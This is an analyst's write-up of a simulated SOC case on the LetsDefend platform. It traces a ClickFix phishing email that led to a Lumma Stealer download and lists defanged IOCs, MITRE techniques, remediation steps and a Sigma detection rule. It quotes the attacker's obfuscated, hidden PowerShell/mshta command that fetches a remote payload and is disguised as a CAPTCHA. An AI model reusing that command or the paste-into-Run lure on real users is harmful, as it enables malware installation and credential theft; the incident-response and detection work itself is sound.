# SOC338: ClickFix Phishing That Led to Lumma Stealer

**Platform:** LetsDefend (simulated SOC, practice case)
**Alert:** SOC338 - Lumma Stealer - DLL Side-Loading via ClickFix Phishing
**Severity:** Critical
**My verdict:** True Positive
**Affected:** user Dylan, host 172.16.17.216 (Windows 10)
**Analyst:** Vimalkanth Muthaliyappan Veerakumar

All times below are UTC. The endpoint console showed times in UTC+3 while the firewall, proxy and Exchange logs were in UTC, so I converted everything to UTC to keep the timeline consistent.

---

## Summary

Dylan got a phishing email pretending to be from Microsoft, offering a free Windows 11 Pro upgrade. The link took him to a fake "verification" page that used the ClickFix trick: it told him to press Win+R, paste, and hit Enter. What he actually pasted was a hidden PowerShell command that used mshta.exe to download a Lumma Stealer payload. He ran it twice.

The firewall allowed the download. I isolated the host and deleted the email. Only Dylan and his machine were affected. Since Lumma steals saved passwords and browser cookies, I'd treat his accounts as compromised.

---

## How I worked it

### 1. Reading the alert

The first things I noticed:

- The sender was `update@windows-update[.]site`. Microsoft doesn't send from a `.site` domain.
- The subject was "Upgrade your system to Windows 11 Pro for FREE", which is a typical too-good-to-be-true lure.
- Device Action said **Allowed**. On an email alert that only means the email was delivered. It doesn't tell you whether anything ran, so I still had to work out what Dylan did after receiving it.
- The MITRE tags (T1204, T1059.001, T1027, T1105, T1574) already described an attack chain: user click, PowerShell, obfuscation, download, DLL side-loading. I treated that as a hypothesis to test, not a conclusion.

### 2. The email

I opened the email in Email Security. It copied Microsoft's layout and product names, but the images were broken, and it had a fake countdown timer to create urgency. There was no attachment, just several "UPDATE NOW" links.

At the bottom was the ClickFix part:

> Step 1: Press & hold the Windows Key + R
> Step 2: In the verification window, press Ctrl + V
> Step 3: Press Enter on your keyboard to finish

Clicking "OK" on a page like this silently copies a command to the clipboard. The user then pastes it into the Run box and runs it without ever seeing it.

### 3. Dylan's machine

This was the deciding step. In Endpoint Security, Terminal History showed three commands around 20:26. The main one:

```
PowerShell.exe -w 1 powershell -Command ('ms]]]ht]]]a]]].]]]exe hxxps://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']')  # ✅ "I am not a robot - reCAPTCHA Verification ID: 3824"
```

Breaking it down:

- `-w 1` hides the window, so Dylan saw nothing.
- `ms]]]ht]]]a]]].]]]exe` with `-replace ']'` turns into `mshta.exe` only when it runs. That gets past simple filters that look for the word "mshta".
- `maloy.mp4` isn't a video. mshta runs it as script.
- Everything after `#` is a PowerShell comment and does nothing. The Run box shows the end of the pasted text, so Dylan only saw the fake "I am not a robot" message and thought he was passing a CAPTCHA. This was the cleverest part of the attack in my opinion.

The process tree confirmed it:

```
explorer.exe
 └─ powershell.exe
     └─ powershell.exe (hidden)
         └─ mshta.exe (PID 7284) → overcoatpassably[.]shop/.../maloy.mp4
```

Explorer launching PowerShell directly is unusual for a normal user and is the typical ClickFix pattern, because the Run box belongs to Explorer.

Browser history showed he visited `windows-update[.]site` at 20:26:08, so he did click the link.

I contained the host at this point, since an infostealer that has already run will keep sending data out for as long as the machine stays online.

**A mistake I nearly made:** I was going to list the mshta.exe hash as an IOC. Then I checked the path, `C:\Windows\System32\mshta.exe`, which is the genuine Microsoft file. Blocking that hash would break Windows and tells you nothing about the attacker. The malicious part is the URL it fetched, not the program.

### 4. Logs and threat intel

- **Threat Intel:** `overcoatpassably[.]shop` was tagged as Lumma Stealer.
- **Proxy log, 20:26:08:** Dylan's host connected to 132.232.40.201:443. That's the same IP that sent the phishing email, so the attacker used one server for both the email and the phishing page.
- **Firewall raw log, 20:26:20:** Dylan's host connected to 172.67.139.19:443, Action **Allowed**, process **mshta.exe, PID 7284**, GET request for the `maloy.mp4` URL.

The PID was the key detail for me. The same PID 7284 showed up in the endpoint process list and in the firewall log, which proves that the malicious mshta process made that download.

The endpoint showed the same events at 23:26 that the logs showed at 20:26. The 3-hour difference matched the +03:00 offset on the alert, which is why I converted everything to UTC.

### 5. Scoping

I searched the logs for the payload IP and the phishing IP. Only Dylan's host showed up, and the Exchange log showed the email was sent only to him. So there was one recipient and one affected machine.

---

## Timeline (UTC, 13 March 2025)

| Time | What happened |
|---|---|
| 06:44:32 | Phishing email delivered to Dylan via Exchange (172.16.20.3) from 132.232.40.201 |
| 20:26:08 | Dylan opens `windows-update[.]site` |
| 20:26:19 | Pastes the ClickFix command (first time) |
| 20:26:20 | mshta.exe (PID 7284) downloads the payload from `overcoatpassably[.]shop` (172.67.139.19), Allowed |
| 20:26:31-32 | Runs the command a second time |
| 20:26:36 - 20:27:15 | Connections to 35.190.80.1 and 77.88.21.119, not confirmed malicious |
| During investigation | I contained the host and deleted the email |

About 13 hours 40 minutes passed between delivery and execution.

---

## IOCs (defanged)

| Type | Indicator | Notes |
|---|---|---|
| Email sender | `update@windows-update[.]site` | Phishing sender |
| Domain | `windows-update[.]site` | ClickFix page |
| IP | `132.232.40.201` | Sent the email and hosted the phishing page |
| Domain | `overcoatpassably[.]shop` | Lumma payload domain (TI confirmed) |
| URL | `hxxps://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy.mp4` | Payload fetched by mshta |
| IP | `172.67.139.19` | Payload host. Looks like a shared CDN range, so I'd block the domain and URL first and review before blocking the IP |

To follow up: `35.190.80.1` and `77.88.21.119` appeared right after execution, but I couldn't confirm them as C2.

---

## MITRE ATT&CK

| Tactic | Technique | Where I saw it |
|---|---|---|
| Initial Access | T1566.002 Spearphishing Link | The email |
| Execution | T1204.001 Malicious Link | Dylan visited the site |
| Execution | T1204.004 Malicious Copy and Paste | Pasted into the Run box |
| Execution | T1059.001 PowerShell | Hidden PowerShell command |
| Defense Evasion | T1027 Obfuscated Files or Information | `-replace` trick, fake `.mp4` |
| Defense Evasion | T1218.005 Mshta | mshta running remote script |
| Command and Control | T1105 Ingress Tool Transfer | Payload download |
| (per alert) | T1574 DLL Side-Loading | In the alert rule, but I didn't see it directly |

The alert's tags didn't include T1218.005, so I added it. Technique IDs should be checked against the current ATT&CK version, as recent releases changed some of these.

---

## What I did

1. Contained Dylan's host through EDR.
2. Deleted the phishing email.
3. Confirmed no other users or hosts were involved.

## What I'd recommend

**Now**
- Reimage the machine instead of trying to clean it.
- Reset all of Dylan's passwords, especially any saved in the browser, and revoke active sessions. Stolen cookies can get around MFA.
- Block the domains and URL at the email gateway, proxy and DNS.
- Search all mailboxes for anything else from `windows-update[.]site` or 132.232.40.201.

**Soon**
- Look into the two unconfirmed IPs and check Dylan's account activity after 20:26.
- Short user awareness note: no real website will ever ask you to paste something into Win+R.

**Detection ideas**
- Alert when explorer.exe starts powershell.exe or mshta.exe with a URL or obfuscation in the command line.
- Watch the RunMRU registry key (`HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`) for entries containing `powershell`, `mshta` or `http`. That's where Win+R commands get recorded.
- Restrict mshta.exe with WDAC or AppLocker if the business doesn't need it.

A rough Sigma rule I'd start from (it would need tuning for a real environment):

```yaml
title: Possible ClickFix Execution via Run Dialog
logsource:
  category: process_creation
  product: windows
detection:
  parent:
    ParentImage|endswith: '\explorer.exe'
  child:
    Image|endswith:
      - '\powershell.exe'
      - '\mshta.exe'
  suspicious_cmd:
    CommandLine|contains:
      - 'http'
      - '-replace'
      - 'mshta'
      - '#'
  condition: parent and child and suspicious_cmd
level: high
```

---

## What I learned

- "Allowed" on an email alert means delivered, not executed. I had to prove execution from the endpoint and the logs.
- Fix the time zones before building a timeline. I initially had the wrong gap between delivery and execution because of the 3-hour offset.
- Matching the same PID across the EDR and the firewall turned a strong guess into proof.
- A Windows binary being abused doesn't make its hash an IOC.
